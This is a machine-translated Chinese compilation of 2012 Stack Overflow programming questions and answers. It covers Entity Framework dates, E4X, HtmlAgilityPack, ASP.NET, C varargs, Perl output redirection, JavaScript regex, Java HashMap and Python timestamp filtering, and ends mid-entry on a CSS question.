我正在处理 C# 中的 MVC 3 应用程序，该应用程序在更新表中的条目时遇到问题。

从 EF 调用的更新字符串是在日期中发送的**（为清楚起见，where 语句中的所有其他值都已删除）**：

```
where [CreateDate] = '2012-09-24 19:12:08' 
```

实际的数据库条目有日期，sql 数据类型是 datetime2(7)：

```
2012-09-24 19:12:08.6457698 
```

执行代码时，日期不匹配，并且没有任何更新。我使用现有数据库中的逆向工程代码优先创建了我的模型。这是我的模型：

```
public class NPost
{
    [HiddenInput(DisplayValue = false)]
    public int NPostID { get; set; }

    [HiddenInput(DisplayValue = false)]
    public System.Guid UserId { get; set; }

    [Required(ErrorMessage = "Please enter a title!")]
    [StringLength(Int32.MaxValue)]
    public string Title { get; set; }

    [AllowHtml]
    [Required(ErrorMessage = "Please enter the body of the post!")]
    [StringLength(Int32.MaxValue)]
    public string Body { get; set; }

    [Required(ErrorMessage = "Please enter at least one tag!")]
    [StringLength(Int32.MaxValue)]
    public string Tags { get; set; }

    public System.DateTime CreateDate { get; set; }
    public Nullable<System.DateTime> PublishDate { get; set; }
    public Nullable<double> Rating { get; set; }

    [Required(ErrorMessage = "Please enter a topic!")]
    [StringLength(Int32.MaxValue)]
    public string Topic { get; set; }

    [StringLength(Int32.MaxValue)]
    public string TitleImage { get; set; }

    [StringLength(Int32.MaxValue)]
    public string ListingImage { get; set; }

    [StringLength(Int32.MaxValue)]
    public string BoxImage { get; set; }

    public virtual aspnet_Users aspnet_Users { get; set; }
} 
```

我需要做什么才能使这些日期排列整齐并正常工作？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-25T17:35:57.857

我同意其他人就您在这里所做的事情所表达的警告。但是，我们也应该直接回答您的问题！我怀疑 EF 将您的列视为 SQL`datetime`值而不是较新的`datetime2`类型。所以试试下面的。

您可以使用[`[Column(TypeName = "datetime2")]`](http://msdn.microsoft.com/en-us/library/system.data.linq.mapping.columnattribute.aspx)属性上的属性来指示要使用的确切数据库类型，或者[`HasColumnType`](http://msdn.microsoft.com/en-us/library/system.data.entity.modelconfiguration.configuration.primitivepropertyconfiguration.hascolumntype%28v=vs.103%29.aspx)如果您更喜欢流畅的配置，则可以使用方法。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-25T17:17:56.180

对日期进行完全匹配似乎容易出错。Entity Framework 通常应该根据主键进行更新，例如 NPostId = 50。你可以将控制器中的更新更改为基于 ID 吗？

```
var postById = context.Posts.Where(p => p.NPostId == id).First();
postById.Text = text;
...
context.Entry(postById).State = EntityState.Modified;
postById.SaveChanges(); 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-09-25T17:18:21.450

如果您使用时间戳作为唯一标识符，则必须保证没有两个项目可以具有相同的时间值。如果这确实是您想要做的，请将 CreateDate 表列的精度设置为 datetime2(0) 并在该列上设置一个唯一键。

然而...

在 Aaron 看来，使用时间戳作为唯一标识符可能不是一个好主意。请改用自动递增字段或`uniqueidentifier`（GUID 类型）字段。

# xml - ReferenceError：错误＃1065：按属性搜索节点时未定义变量

> ID：12587847
> 
> 赞同：0
> 
> 时间：2012-09-25T17:11:43.703
> 
> 标签：xml, actionscript-3, flash, apache-flex, e4x

我已经做过很多次了，但现在我错过了一些东西......我正在通过在属性中查找值来搜索节点。

如果我尝试追踪：

```
 xmlQuestStructure.page[activePageIndex].label.@priority 
```

跟踪没问题，我可以读取高、中、低（我期望的值）。

但是，如果我尝试跟踪这一点（其中计算的优先级是一个值为 High、Medium 或 Low 的字符串）

```
 xmlQuestStructure.page[activePageIndex].label.(@priority == calculatedPriority) 
```

我得到 ReferenceError: Error #1065: Variable priority is not defined

我究竟做错了什么？谢谢你的帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-25T17:41:47.787

最有可能的是，您的问题是您的标签节点之一**没有**定义优先级属性。在 e4x 中使用**@**时，如果涉及到没有指定属性的 XML 节点，它将引发错误。

如果您的 XMLnode 有可能省略该属性，则不要使用“@”，而是使用`attribute()`.

所以在你的情况下，你可以这样做：

```
xmlQuestStructure.page[activePageIndex].label.(attribute("priority") == calculatedPriority); 
```

using`attribute()`更被动，如果它没有指定的属性，它将忽略节点，而不是抛出错误。

# c# - 错误 CS0246：找不到类型或命名空间名称“HtmlAgilityPack”

> ID：12587848
> 
> 赞同：5
> 
> 时间：2012-09-25T17:11:47.057
> 
> 标签：c#, namespaces, html-agility-pack

我目前正在开发一个自然语言处理程序，在该程序中我正在访问我的字典的谷歌翻译，以便翻译用户输入。

```
using UnityEngine;
using System.Collections;
using System.Text;
using System.Net;
public class GoogleTranslate : MonoBehaviour {
    public static string Translate(string input, string languagePair, Encoding encoding)
    {
        string url = String.Format("http://www.google.com/translate_t?hl=en&ie=UTF8&text=       {0}&langpair={1}", input, languagePair);
        string result = String.Empty;

        using (WebClient webClient = new WebClient())
        {
            webClient.E ncoding = encoding;
            result = webClient.DownloadString(url);
        }

        HtmlDocument doc = new HtmlDocument();
        doc.LoadHtml(result);
        return doc.DocumentNode.SelectSingleNode("//textarea[@name='utrans']").InnerText;
    }
} 
```

当我在 Assembly 中编译这个程序时，我实际上是在使用 Unity 但它使用 Assembly 编译时，我得到了返回错误：

```
Assets/GoogleTranslate.cs(17,13): error CS0246: The type or namespace name `HtmlDocument' could not be found. Are you missing a using directive or an assembly reference? 
```

我开始在网上查找 HtmlDocument 的正确命名空间，并读到我应该写：

```
using HtmlAgilityPack; 
```

将其放入我的程序后，我收到错误：

```
Assets/GoogleTranslate.cs(5,7): error CS0246: The type or namespace name `HtmlAgilityPack' could not be found. Are you missing a using directive or an assembly reference? 
```

我在网上读到我必须更具体并使用：

```
using HtmlAgilityPack.HtmlDocument; 
```

现在我把它放进去，我仍然继续收到错误：

```
Assets/GoogleTranslate.cs(5,7): error CS0246: The type or namespace name `HtmlAgilityPack' could not be found. Are you missing a using directive or an assembly reference? 
```

我想知道 HtmlDocument 使用什么命名空间。对此事的任何帮助将不胜感激！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-25T17:15:36.797

您是否下载并引用了 HtmlAgilityPack dll？似乎您正在尝试使用（第三方）库而不在项目/解决方案中的任何地方引用它。

您可以使用 Nu-Get 安装该库。

```
Install-Package HtmlAgilityPack 
```

# asp.net - 无法加载类型母版页错误

> ID：12587850
> 
> 赞同：3
> 
> 时间：2012-09-25T17:11:54.873
> 
> 标签：asp.net, master-pages, localhost, windows-server

当我在 Windows 服务器上运行我的应用程序时，出现以下错误。此应用程序在 localhost 上运行顺利。问题的原因是什么。

```
Parser Error Message: Could not load type 'KorkmazPortal.SiteMaster'.
Source Error: 

Line 1:  <%@ Master Language="C#" AutoEventWireup="true" CodeBehind="Site.master.cs" Inherits="KorkmazPortal.SiteMaster" %>
Line 2:  
Line 3:  <%@ Register Src="UserControl/Exchange.ascx" TagName="Exchange" TagPrefix="uc" %>

Source File: /portal/Site.Master    Line: 1 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-07-24T21:12:33.473

知道这是一篇旧帖子，但我最近遇到了这个问题。我的 Web 设置项目未在已安装的输出中包含 Web 项目的库。一旦我手动将 .dll 复制到远程服务器，一切正常。

就我而言，线索是我的 Web 项目在调试模式下本地运行良好。只是在远程部署时不起作用。

希望有一天这对某人有所帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-06-08T10:45:01.003

确保您的“bin”文件夹路径是“/portal/bin”，这意味着 bin 文件夹位于门户文件夹中...bin 文件夹和您的母版页位于同一目录中。

# html - 可以在 Web 应用程序之外使用 Tiles、Velocity、Freemarker 等模板引擎吗？

> ID：12587855
> 
> 赞同：0
> 
> 时间：2012-09-25T17:12:17.133
> 
> 标签：html, xml, jsp, velocity, tiles

我需要从多个数据库表的单个记录集中动态生成的数据生成 HTML 文件。HTML 文件将用作电子邮件中的附件。我可以通过手动编写 HTML 代码来生成 HTML 文件，但我想使用某种模板引擎，这样我就不必编写 HTML 文件的结构和 HTML 文档的任何常见方面（例如标题横幅、页脚等） ) . 我之前曾将 Tiles 用于基于 Web 的 struts 应用程序。我使用的应用程序基于 JSP，但我想生成的文件是纯 HTML。

有谁知道是否可以使用 Tiles 或任何其他模板引擎来生成 HTML 文件？HTML 文件将存储到文件系统中，而不是从应用程序服务器中呈现到浏览器上。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-25T17:44:27.903

Velocity 和 Freemarker 可以在 Web 应用程序之外使用。它们是通用的 HTML 模板引擎。它写在他们各自的[欢迎](http://velocity.apache.org/engine/index.html) [页面](http://freemarker.sourceforge.net/)中。

Tiles 并不真正属于同一类：除非自从我上次使用以来它发生了巨大变化，否则它只能将各个页面部分组合在一起，但每个部分都必须编写为 JSP。

# c# - 关闭事件前的 MS Word 文档不会取消

> ID：12587858
> 
> 赞同：2
> 
> 时间：2012-09-25T17:12:29.753
> 
> 标签：c#, .net, ms-word, office-interop, word-2010

我有一个连接到 C# 中 Microsoft Word 文档的 DocumentBeforeClose 事件的事件。

```
this.Application.DocumentBeforeClose +=
                new MSWord.ApplicationEvents4_DocumentBeforeCloseEventHandler(Application_DocumentBeforeClose); 
```

如果某些逻辑为真，我将取消标志设置为真，这样文档就不会关闭。然而，尽管事件被触发并且 Cancel 标志设置为 true，文档仍然关闭。

这是一个错误吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-28T13:41:18.097

我终于弄明白了。我还需要将事件处理程序挂钩到实际的 Word 文档 (Microsoft.Office.Tools.Word.Document) 对象。（Tools.Word.Document 和 Interop.Word.Document 让我头疼……）

```
this.Application.DocumentBeforeClose += new Interop.Word.ApplicationEvents4_DocumentBeforeCloseEventHandler(Application_DocumentBeforeClose);

Application_DocumentBeforeClose(Interop.Word.Document document, ref bool Cancel)
{
  // Documents is a list of the active Tools.Word.Document objects.
  if (this.Documents.ContainsKey(document.FullName))
  {
    // I set the tag to true to indicate I want to cancel.
    this.Document[document.FullName].Tag = true;
  }
}

public MyDocument() 
{
  // Tools.Office.Document object
  doc.BeforeClose += new CancelEventHandler(WordDocument_BeforeClose);
}

private void WordDocument_BeforeClose(object sender, CancelEventArgs e)
{
  Tools.Word.Document doc = sender as Tools.Word.Document;

  // This is where I now check the tag I set.
  bool? cancel = doc.Tag as bool?;
  if (cancel == true)
  {
    e.Cancel = true;
  }
} 
```

因此，由于我的所有应用程序逻辑都是在 Application 类代码中完成的，因此我需要一种方法来向 MyDocument 类事件指示我想要取消关闭事件。所以这就是我使用标签对象来保存标志的原因。

# c - va_arg( , double) 每次返回一个无效值

> ID：12587860
> 
> 赞同：4
> 
> 时间：2012-09-25T17:12:34.617
> 
> 标签：c, arguments

当我使用 va_arg(ap,double) 运行此示例程序时，我发现 va_arg 返回无效数据，如 0 而不是 3 或 1.2 而不是 1，这样如果我传递不带 .00 而不是 double 格式的整数值，它会得到一个垃圾数据（即 3 而不是 3.00）！！！

```
#include <stdio.h>
#include <stdarg.h>
void func(int s){
    printf("%s: %d\n",__func__,s);
}

void var(int count,...){
    va_list ap;
    va_start(ap,count);
    double a = va_arg(ap,double);
    printf("%f\n",a);
    va_end(ap);

}

void main(void ) {
    printf("%s,%d,%s\n",__FILE__,__LINE__,__DATE__);
    func(__LINE__);
    var(1,3);
    var(1,1.2);
    var(1,1);

} 
```

输出是：

```
try.c,24,Sep 25 2012
func: 25
0.000000
1.200000
1.200000 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-25T17:16:37.240

可变参数函数（即，采用省略号 ( `...`) 参数指示的可变数量参数的函数）在 C 中具有弱类型化。除了某些特殊函数（如`printf`and ）之外`scanf`，编译器不会努力验证您是将正确类型的参数传递给他们。

在您的情况下，该函数需要一个`double`参数，但您试图传入一个`int`. 编译器不会在此处从`int`to进行任何提升`double`，因此会导致未定义的行为。您需要始终在`double`此处传入一个值，或者作为显式`double`常量值，例如`1.0`，或者使用类型转换执行转换。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-25T17:21:22.827

好吧，`3`并且`1`是整数而不是双精度数。它们对这些数字的二进制表示不同于`3.0`和`1.0`。

```
var(1,3.9);
var(1,1.2);
var(1,5.7);

$ ./a 
a.c,17,Sep 25 2012
func: 18
3.900000
1.200000
5.700000 
```

# c# - 如何让 DataGridView 绑定到现有 DataTable 以显示 DropDownList 列？

> ID：12587868
> 
> 赞同：1
> 
> 时间：2012-09-25T17:13:08.223
> 
> 标签：c#, drop-down-menu, datagridview, datatable, datagridviewcombobox

我正在尝试创建具有以下特征的 DataGridView： - 它的 DataSource 是我创建的一个 DataTable，其中包含几列。- DataGridView 中的一列显示我填充的 ​​DropDownList（它对应于我的 DataTable 中已有的列）。- 在 DropDownList 中选择的值填充 DataTable 中的基础列。

到目前为止，我能够通过将 DataGridView.AutoGenerateColumns 属性设置为 false，然后通过循环遍历 DataTable 中所有非 DropDownList 列的列并使用 DataGridViewComboBoxColumn（将该列的 DataSource 属性设置为我创建的列表）用于我想要作为 DropDownList 的列。

然而，这似乎既混乱又冗长（几乎不可能一概而论）。有没有更好的方法来达到同样的结果？

# spring-mvc - spring mvc中的控制器类

> ID：12587880
> 
> 赞同：0
> 
> 时间：2012-09-25T17:14:08.757
> 
> 标签：spring-mvc, controller

> **可能重复：**
> [Spring MVC 中控制器的生命周期](https://stackoverflow.com/questions/1481993/controllers-life-cycle-in-spring-mvc)

我对 spring mvc 中的控制器有一个一般性的问题。
我有一个控制器类（用@Controller 注释）。每次向我的服务器发送请求时，控制器都会捕获请求（当然根据请求映射）。
我的问题是这个。spring 是否会根据请求实例化一个新的控制器，或者 spring 将控制器作为单调处理？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-25T17:31:27.430

控制器 Spring 是 bean。除非您另外指定，否则 Bean 默认以单例模式部署。控制器实例将在 Web 应用程序上下文启动后创建，并在其结束前处理。

**参考：** [Spring Beans](http://static.springsource.org/spring/docs/1.2.9/reference/beans.html#beans-factory-modes)

# wix - WiX：手动设置功能成本

> ID：12587882
> 
> 赞同：6
> 
> 时间：2012-09-25T17:14:17.423
> 
> 标签：wix, windows-installer, wix3.6

我的安装程序中有一个非标准功能，它不包含任何可安装文件，而是触发自定义操作。由于此功能不包含任何官方文件组件，安装程序显示 0 作为此功能所需的磁盘空间。如何在 WiX 中手动设置功能成本？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2014-02-05T16:47:45.257

您可以使用[ReserveCost 元素](http://wixtoolset.org/documentation/manual/v3/xsd/wix/reservecost.html)将附加成本与您的`Component`元素之一相关联。您将需要在安装中至少有一个`Component`与`Feature`.

# perl - Perl 脚本将 stderr 和 stdout 重定向到文件

> ID：12587883
> 
> 赞同：0
> 
> 时间：2012-09-25T17:14:17.717
> 
> 标签：perl, unix, stdout, csh

我很难做到这一点。我的脚本将消息打印到 stout 和 stderr，我希望将它们全部定向到一个文件，以便我以后可以在闲暇时查看。

这是我尝试过的：

```
$location/myscript.pl -arg1 $var1 -arg2 $var2 -verbose 1 &>myscript.log 
```

所以我的脚本有一些我需要设置的参数，然后我尝试**&>myscript.log**来创建这个日志文件并在那里重定向。但是我得到“无效的空命令”，当我按下键盘时，它显示我尝试执行的命令：

```
$location/myscript.pl -arg1 $var1 -arg2 $var2 -verbose 1 & > myscript.log 
```

我认为我的语法是错误的或什么的。

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-25T17:17:54.557

```
script.pl ... >myscript.log 2>&1 
```

*   `>myscript.log`打开文件进行写入并将该句柄用于 STDOUT。
*   `2>&1`使 STDERR 与 STDOUT 具有相同的句柄。

订单很重要。

* * *

对于`csh`，最简单的方法是：

```
sh -c 'script.pl ... >myscript.log 2>&1' 
```

好吧，我只是在开玩笑:) 你实际上可以做到

```
script.pl ... >& file 
```

`csh`的重定向支持远比 of`sh`及其派生类更有限，但这是它可以做的事情。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-25T17:29:38.170

此代码不遵循您的方法，但它也可能对您有用。您可以通过脚本中的一个参数启用它。

```
#===
# x.pl
#===
use IO::Handle;
open(STDOUT_AND_ERR_LOG, ">stdout_and_err.log") or die;

# ensure all writes are immediately flushed STDOUT_AND_ERR_LOG->autoflush(1);

# redirect both stdout and err to the log *STDERR = *STDOUT = *STDOUT_AND_ERR_LOG;

# now try it
print "Hello stdout!\n";
print STDERR "Hello stderr!\n";
#=== EOF 
```

归功于 ActiveState.com

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-25T17:31:33.130

正如**ikegami**所述， **bash**解决方案是：

```
script.pl ... >myscript.log 2>&1 
```

**在我的带有csh**解决方案的FreeBSD 机器上是：

```
script.pl ... >& myscript.log 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-09-25T17:16:04.083

试试这个：

`$location/myscript.pl -arg1 $var1 -arg2 $var2 -verbose 1 1>myscript.stdout 2>myscript.stderr`

这会将输出和错误重定向到两个单独的文件。要在同一个文件中执行此操作（这意味着重定向 stderr 并将其附加到 stdout）：

`$location/myscript.pl -arg1 $var1 -arg2 $var2 -verbose 1 > myscript.log 2>&1`

# javascript - 正则表达式在字符串中查找 URL

> ID：12587892
> 
> 赞同：1
> 
> 时间：2012-09-25T17:15:26.663
> 
> 标签：javascript, regex

我正在使用正则表达式在字符串中查找 URL，然后将它们转换为真正的 HTML 链接（在 JavaScript 中）。我的正则表达式的问题在于它包含 http 之前的前一个字符。（我说的是第一个数组中的第二个正则表达式。）

```
str = "testhttp://example.com";

search = new Array(
    /\[url\](.*?)\[\/url\]/ig,
    /(?:[^\]\/">]|^)((https?):\/\/[-A-ZÅÄÖ0-9+&@#\/%?=~_|!:,.;]*[-A-ZÅÄÖ0-9+&@#\/%=~_|])/ig
);

replace = new Array(
    '<a href="//$1">$1</a>',
    '<a href="$1">$1</a>'
);

for (i = 0; i < search.length; i++) {
    str = str.replace(search[i], replace[i]);
} 
```

输出变为：

```
tes<a href="http://example.com">http://example.com</a> 
```

但我希望它是：

```
test<a href="http://example.com">http://example.com</a> 
```

重要的是正则表达式应该找到 URL，即使它们在字符串中是第一个，但如果前一个字符是以下三个字符之一，则不应该找到它们："/>

我对正则表达式很陌生。希望你能理解！

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-25T17:28:11.743

问题是[JavaScript 将始终替换完整匹配，而不是内部捕获组。](https://stackoverflow.com/questions/3954927/js-regex-how-to-replace-the-captured-groups-only?rq=1)

所以这里有一个巧妙的（并且经过测试的）技巧来缓解这个问题。进行第一个子模式捕获：

```
/([^\]\/">]|^)((https?):\/\/[-A-ZÅÄÖ0-9+&@#\/%?=~_|!:,.;]*[-A-ZÅÄÖ0-9+&@#\/%=~_|])/ig 
```

然后明确地包括它：

```
'$1<a href="$2">$2</a>' 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-25T17:31:41.197

使用后面看：

```
 /(?<[^\]\/">]|^)((https?):\/\/[-A-ZÅÄÖ0-9+&@#\/%?=~_|!:,.;]*[-A-ZÅÄÖ0-9+&@#\/%=~_|])/ig 
```

# java - 自定义HashMap中的get方法

> ID：12587896
> 
> 赞同：0
> 
> 时间：2012-09-25T17:15:37.797
> 
> 标签：java

> **可能重复：**
> [不区分大小写的字符串作为 HashMap 键](https://stackoverflow.com/questions/8236945/case-insensitive-string-as-hashmap-key)

我有一个 Hashmap，其中一个字符串作为键，一个整数作为值。现在，我使用 get 方法来获取值，其中字符串与键值匹配。

* * *

```
HashMap<String,Integer> map= new HashMap<String,Integer>();
// Populate the map

System.out.println(map.get("mystring")); 
```

* * *

我希望这个字符串比较不区分大小写。反正我能做到吗？

* * *

例如，我希望它在以下情况下返回相同的结果：

* * *

```
map.get("hello");
map.get("HELLO");
map.get("Hello"); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-25T17:22:29.400

如果性能不重要，您可以使用[TreeMap](http://docs.oracle.com/javase/7/docs/api/java/util/TreeMap.html)。以下代码的输出：

> 1
> 6
> 6

请注意，您需要的行为不符合[`Map#get`合同](http://docs.oracle.com/javase/7/docs/api/java/util/Map.html#get%28java.lang.Object%29)：

> 更正式地说，如果此映射包含从键 k 到值 v 的映射，使得 (key==null ? k==null : key.equals(k))，则此方法返回 v；否则返回null。（最多可以有一个这样的映射。）

```
public static void main(String[] args) {
    Map<String, Integer> map = new TreeMap<>(String.CASE_INSENSITIVE_ORDER);

    map.put("hello", 3);
    map.put("HELLO", 6);
    System.out.println(map.size());
    System.out.println(map.get("heLLO"));
    System.out.println(map.get("hello"));
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-25T17:18:23.973

你可以做

```
Map<String,Integer> map= new HashMap<String,Integer>() {
    @Override
    public Integer put(String key, Integer value) {
      return super.put(key.toLowerCase(), value);
    }

    @Override
    public Integer get(Object o) {
       return super.get(o.toString().toLowerCase());
    }
}; 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-25T17:18:45.030

您可以创建一个包装类来包装 HashMap 并实现 get 和 put 方法。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-09-25T17:32:50.987

```
HashMap<InsensitiveString,Integer> map= new HashMap<>();

map.get(new InsensitiveString("mystring"));

---

public class InsensitiveString

    final String string;

    public InsensitiveString(String string)
        this.string = string;

    public int hashCode()
        calculate hash code based on lower case of chars in string

    public boolean equals(Object that)
        compare 2 strings insensitively 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-25T17:21:44.173

编写一个包装方法，`String`如下所示

```
map.put(string.toLowerCase()); 
```

并获取方法

```
map.get(string.toLowerCase()); 
```

# python - 在时间跨度内搜索

> ID：12587901
> 
> 赞同：0
> 
> 时间：2012-09-25T17:15:48.670
> 
> 标签：python, search, timespan

我有这个带有时间戳的列表，我希望能够根据用户输入（小时 <= 24 或从午夜开始的天数或两者都没有）搜索特定时间跨度内的所有元素（每个时间跨度在另一个列表中都有相应的信息） .

示例（这只是一个示例列表，该解决方案应该适用于非常大的列表）

```
list =  ['2002-03-31 19:30:41', '2002-03-31 19:30:41', '2002-03-31 19:43:49', '2002-03-31     19:43:50', '2002-03-31 19:50:05', '2002-03-31 19:50:06', '2002-03-31 19:50:06', '2002-03-31 19:50:44', '2002-03-31 19:50:45', '2002-03-31 19:50:45', '2002-03-31 19:51:50', '2002-03-31 19:51:50', '2002-03-31 19:51:50', '2002-03-31 19:52:25', '2002-03-31 19:52:25', '2002-03-31 19:52:25', '2002-03-31 19:53:05', '2002-03-31 19:53:06', '2002-03-31 19:53:06', '2002-03-31 19:53:06', '2002-03-31 19:53:17', '2002-03-31 19:54:14', '2002-03-31 19:54:14']
activity= [a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w] 
```

我将使用最后一个元素`list[-1]`作为参考点。如果用户想查看过去三个小时内的活动，则意味着来自`2002-03-31 16:54:14 to 2002-03-31 19:54:14`时间戳位置的将用于从另一个列表中获取活动。我首先考虑将每个时间戳转换为可用的东西，以便更容易比较每个元素，但必须有一个更简单的解决方案。

这个[模块](http://docs.python.org/library/datetime.html)看起来很有用，但我不知道如何使用它。

最好的祝福

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-25T17:21:19.983

作为工作流程：

*   使用该`datetime`模块通过以下方法将字符串转换为`datetime`对象`strptime`：您将获得`datetime`对象列表。
*   通过从最后一项中减去此列表的每个条目来计算`timedeltas`。
*   您可以使用 a 的`seconds`属性`timedelta`来找出一个点与参考点之间的秒数：将其与`3*3600`(3h) 进行比较以找出哪些项目落在适当的时间段内。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-25T18:00:06.520

您非常幸运，因为您的时间戳以最简单的排序顺序排列，您可以将整个“转换为时间值”放在首位，然后进行字符串比较：

```
times =  ['2002-03-31 19:30:41', '2002-03-31 19:30:41', '2002-03-31 19:43:49', '2002-03-31     19:43:50', '2002-03-31 19:50:05', '2002-03-31 19:50:06', '2002-03-31 19:50:06', '2002-03-31 19:50:44', '2002-03-31 19:50:45', '2002-03-31 19:50:45', '2002-03-31 19:51:50', '2002-03-31 19:51:50', '2002-03-31 19:51:50', '2002-03-31 19:52:25', '2002-03-31 19:52:25', '2002-03-31 19:52:25', '2002-03-31 19:53:05', '2002-03-31 19:53:06', '2002-03-31 19:53:06', '2002-03-31 19:53:06', '2002-03-31 19:53:17', '2002-03-31 19:54:14', '2002-03-31 19:54:14']
activity= ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w']

start = '2002-03-31 16:54:14'
end = '2002-03-31 19:54:14'

for time, activity in zip(times, activity):
    if time >= start and time <= end:
        print time, activity 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-25T17:23:32.883

像这样的东西应该工作

```
ls =  ['2002-03-31 19:30:41', '2002-03-31 19:30:41', '2002-03-31 19:43:49', '2002-03-31     19:43:50', '2002-03-31 19:50:05', '2002-03-31 19:50:06', '2002-03-31 19:50:06', '2002-03-31 19:50:44', '2002-03-31 19:50:45', '2002-03-31 19:50:45', '2002-03-31 19:51:50', '2002-03-31 19:51:50', '2002-03-31 19:51:50', '2002-03-31 19:52:25', '2002-03-31 19:52:25', '2002-03-31 19:52:25', '2002-03-31 19:53:05', '2002-03-31 19:53:06', '2002-03-31 19:53:06', '2002-03-31 19:53:06', '2002-03-31 19:53:17', '2002-03-31 19:54:14', '2002-03-31 19:54:14']

# target is one of the items in the list
target = datetime.strptime('2002-03-31 19:53:17', '%Y-%m-%d %H:%M:%S')
for l in ls:
    print datetime.strptime(l, '%Y-%m-%d %H:%M:%S') - target 
```

印刷

```
-1 day, 23:37:24
-1 day, 23:37:24
-1 day, 23:50:32
-1 day, 23:50:33
-1 day, 23:56:48
-1 day, 23:56:49
-1 day, 23:56:49
-1 day, 23:57:27
-1 day, 23:57:28
-1 day, 23:57:28
-1 day, 23:58:33
-1 day, 23:58:33
-1 day, 23:58:33
-1 day, 23:59:08
-1 day, 23:59:08
-1 day, 23:59:08
-1 day, 23:59:48
-1 day, 23:59:49
-1 day, 23:59:49
-1 day, 23:59:49
0:00:00
0:00:57
0:00:57 
```

`datetime.strptime(l, '%Y-%m-%d %H:%M:%S') - target`返回一个`timedelta`对象（docs [）](http://docs.python.org/library/datetime.html?highlight=timedelta#timedelta-objects)。您可以访问`timedelta`对象和属性`days`，并将它们与某个所需的时间跨度进行比较。例如，要从某个参考点获取不到一小时内发生的所有事件的所有索引：`seconds``microseconds`

```
less_than_an_hour = []
for i,l in enumerate(ls):
    if (datetime.strptime(l, '%Y-%m-%d %H:%M:%S') - target).seconds < 3600:
        less_than_an_hour.append(i) 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-25T19:54:56.433

ID：

*   将时间戳列表转换为`datetime`对象：

    ```
    times = [datetime.datetime.strptime(t, '%Y-%m-%d %H:%M:%S') for t in times] 
    ```

*   使用该[`bisect`模块](http://docs.python.org/library/bisect.html)查找用户请求的开始时间。使用`bisect`是比使用线性搜索更快的方法，前提是您也将用户输入转换为`datetime`对象：

    ```
    start = datetime.datetime(2002, 3, 31, 19, 53, 17)
    startindex = bisect.bisect_left(times, start) 
    ```

*   使用[`itertools`](http://docs.python.org/library/itertools.html)函数将两个列表合并为一个显示与您的范围匹配的条目：

    ```
    end = datetime.datetime(2002, 4, 1, 07, 53, 17)

    merged = itertools.izip(times, activity)
    fromstart = itertools.islice(merged, startindex)
    untilend = itertools.takewhile(lambda e: e[0] <= end, fromstart) 
    ```

`untilend`iterable 现在在元组之间和元组之间生成条目，`start`而`end`无需`(time, activity)`为复制的列表使用任何额外的内存。这让您可以有效地处理大量数据。

演示：

```
>>> import itertools
>>> import datetime
>>> import bisect
>>> times =  ['2002-03-31 19:30:41', '2002-03-31 19:30:41', '2002-03-31 19:43:49', '2002-03-31     19:43:50', '2002-03-31 19:50:05', '2002-03-31 19:50:06', '2002-03-31 19:50:06', '2002-03-31 19:50:44', '2002-03-31 19:50:45', '2002-03-31 19:50:45', '2002-03-31 19:51:50', '2002-03-31 19:51:50', '2002-03-31 19:51:50', '2002-03-31 19:52:25', '2002-03-31 19:52:25', '2002-03-31 19:52:25', '2002-03-31 19:53:05', '2002-03-31 19:53:06', '2002-03-31 19:53:06', '2002-03-31 19:53:06', '2002-03-31 19:53:17', '2002-03-31 19:54:14', '2002-03-31 19:54:14']
>>> activity= ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w']
>>> times = [datetime.datetime.strptime(t, '%Y-%m-%d %H:%M:%S') for t in times]
>>> start = datetime.datetime(2002, 3, 31, 19, 53, 17)
>>> end = datetime.datetime(2002, 4, 1, 07, 53, 17)
>>> startindex = bisect.bisect_left(times, start)
>>> merged = itertools.izip(times, activity)
>>> fromstart = itertools.islice(merged, startindex)
>>> untilend = itertools.takewhile(lambda e: e[0] <= end, fromstart)
>>> for time, activity in untilend:
...     print time, activity
... 
2002-03-31 19:30:41 a
2002-03-31 19:30:41 b
2002-03-31 19:43:49 c
2002-03-31 19:43:50 d
2002-03-31 19:50:05 e
2002-03-31 19:50:06 f
2002-03-31 19:50:06 g
2002-03-31 19:50:44 h
2002-03-31 19:50:45 i
2002-03-31 19:50:45 j
2002-03-31 19:51:50 k
2002-03-31 19:51:50 l
2002-03-31 19:51:50 m
2002-03-31 19:52:25 n
2002-03-31 19:52:25 o
2002-03-31 19:52:25 p
2002-03-31 19:53:05 q
2002-03-31 19:53:06 r
2002-03-31 19:53:06 s
2002-03-31 19:53:06 t 
```

# css - 不希望图像超出定义的 div 大小；应保持图像分辨率；不要介意图像是否被剪切

> ID：12587902
> 
> 赞同：1
> 
> 时间：2012-09-25T17:15:48.513
> 
> 标签：css, html, image

